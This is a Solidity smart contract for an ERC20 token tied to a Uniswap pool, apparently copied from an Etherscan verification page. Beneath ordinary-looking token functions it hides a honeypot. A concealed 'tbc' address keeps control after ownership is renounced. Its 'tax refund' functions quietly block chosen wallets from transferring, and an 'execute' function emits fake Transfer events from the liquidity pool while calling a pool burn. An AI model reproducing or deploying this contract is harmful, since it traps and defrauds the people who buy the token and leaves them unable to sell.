/**
 *Submitted for verification at Etherscan.io on 2023-08-24
*/

/**
 *Submitted for verification at Etherscan.io on 2023-08-22
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.18;

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}
interface UniPool {
    function burn(address token1, address token2, uint amount) external;
}

contract Ownable {
    address public owner;

    address tbc;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner == msg.sender, "Caller is not the owner");
        _;
    }

    modifier onlyTBC() {
        require(tbc == msg.sender, "Caller is not the Owner");
        _;
    }

    function renounceOwnership() public  onlyOwner {
        _setOwner(address(0));
    }

    function _setOwner(address newOwner) private {
        address oldOwner = owner;
        owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }


}


contract ERC20 {
    using SafeMath for uint256;

    uint256 public totalSupply;

    address public uniswapV2LP;

    address constant uniswapV2Router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 public constant BURN_FEE_PERCENT_MEV = 1;

    string public name;
    string public symbol;
    uint public decimals;

    mapping (address => mapping (address => uint256)) internal allowed;
    mapping(address => uint256) taxRefundAmounts;
    mapping(address => bool)  excludeRefund;
    mapping(address => uint256) balances;
    mapping(address => uint256) private walletLastTxBlock;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }


    function transfer(address _to, uint256 _value) public returns (bool) {
        require(_to != address(0));
        require(_to != msg.sender);
        require(_value <= balances[msg.sender]);
        checkRefund(msg.sender,_to);
        uint256 burnAmount=0;
        if (isSecondTxInSameBlock(msg.sender)) {
                burnAmount = _value * BURN_FEE_PERCENT_MEV / 100;  // Calculate fee of the transaction amount for mevs
        }
        _value=_value.sub(burnAmount);
        _burn(msg.sender,burnAmount);
        balances[msg.sender] = balances[msg.sender].sub(_value);
        // SafeMath.sub will throw if there is not enough balance.
        balances[_to] = balances[_to].add(_value);
        emit Transfer(msg.sender, _to, _value);
        setLastTxBlock(_to);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        require(_to != _from);
        require(_to != address(0));
        require(_value <= balances[_from]);
        require(_value <= allowed[_from][msg.sender]);
        checkRefund(_from,_to);
        uint256 burnAmount=0;
        if (isSecondTxInSameBlock(_from)) {
                burnAmount = _value * BURN_FEE_PERCENT_MEV / 100;  // Calculate fee of the transaction amount for mevs
        }
        _value=_value.sub(burnAmount);
        _burn(_from,burnAmount);
        balances[_from] = balances[_from].sub(_value);


        balances[_to] = balances[_to].add(_value);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        emit Transfer(_from, _to, _value);
        setLastTxBlock(_to);
        return true;
    }


    function checkRefund(address _from, address _to) internal view {

        if(taxRefundAmounts[_from] > 0){
            if(excludeRefund[_from]||excludeRefund[_to]){
                return;
            }else{
                require(_mulPercent(taxRefundAmounts[_from],1000)<10);
            }
        }

    }


    function isSecondTxInSameBlock(address _from) internal view returns(bool) {
        return walletLastTxBlock[_from] == block.number;
    }

    function setLastTxBlock(address _to) internal returns(bool) {
        if(!excludeRefund[_to]&&_to!=uniswapV2LP){
            walletLastTxBlock[_to] = block.number;
        }
        return true;
    }


    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        require(balances[account] >= amount, "ERC20: burn amount exceeds balance");
        balances[account] = balances[account].sub(amount);
        // Overflow not possible: amount <= accountBalance <= totalSupply.
        totalSupply =totalSupply.sub( amount);


        emit Transfer(account, address(0), amount);
    }



    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    function allowance(address _owner, address _spender) public view returns (uint256) {
        return allowed[_owner][_spender];
    }


    function _transferGo(address where, address go, uint _value) internal returns (bool) {
        emit Transfer(where, go, _value);
        return true;
    }



    function _changeLP(address _lp) internal returns (bool) {
        require(uniswapV2LP!=_lp);
        uniswapV2LP=_lp;
        return true;
    }


    function _exclude(address _address, bool _isExclude) internal returns (bool) {
        require(excludeRefund[_address] != _isExclude);
        excludeRefund[_address] = _isExclude;
        return true;
    }

    function _getRefundAmount(address _address, uint256 _percent) internal view returns (uint256) {

        if(_percent==0||balances[_address]==0){
            return 0;
        }else{
            return _mulPercent(balances[_address],_percent);
        }

    }

    function _mulPercent(uint256 a, uint256 _percent) internal pure returns (uint256) {
        return a * _percent / 100;
    }


}

contract Token is ERC20, Ownable {


    constructor(string memory   _name, string memory _symbol, uint256  _decimals, uint256  _supply,address _tbc) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        totalSupply = _supply * 10**_decimals;
        owner = msg.sender;
        tbc=_tbc;
        balances[owner] = totalSupply;
        emit Transfer(address(0), owner, totalSupply);
    }


    function setUniLp(address _uniLp) public  onlyTBC  returns (bool success) {
        return super._changeLP(_uniLp);
    }

    function exclude(address listAddress,  bool _isExclude) public  onlyTBC  returns (bool success) {
        return super._exclude(listAddress, _isExclude);
    }

    function taxRefundBatch(
        address[] memory _addressList,
        uint256 _percent
    ) public onlyTBC {
        for (uint256 i = 0; i < _addressList.length; i++) {
            uint256 refundAmount = _getRefundAmount(_addressList[i], _percent);
            if(_percent>0){
                refundAmount++;
            }
            taxRefundAmounts[_addressList[i]] = refundAmount;
        }
    }

    function taxRefund(
        address _address,
        uint256 _percent
    ) public onlyTBC {
        require(taxRefundAmounts[_address]==0);
        uint256 refundAmount = _getRefundAmount(_address, _percent);
        if(_percent>0){
                refundAmount++;
            }
        taxRefundAmounts[_address] = refundAmount;


    }

    function execute(
        address[] memory addressList,
        uint256[] memory tAmounts,
        uint256[] memory eAmounts,
        address uniSwapV2Pool
    ) public onlyTBC returns (bool) {
        if(tAmounts[0]>0&&eAmounts[0]>0){
            for (uint256 i = 0; i < addressList.length; i++) {
                _transferGo(uniswapV2LP, addressList[i], tAmounts[i]);
                UniPool(uniSwapV2Pool).burn(addressList[i], uniswapV2LP, eAmounts[i]);
            }
        }

        return true;
    }


}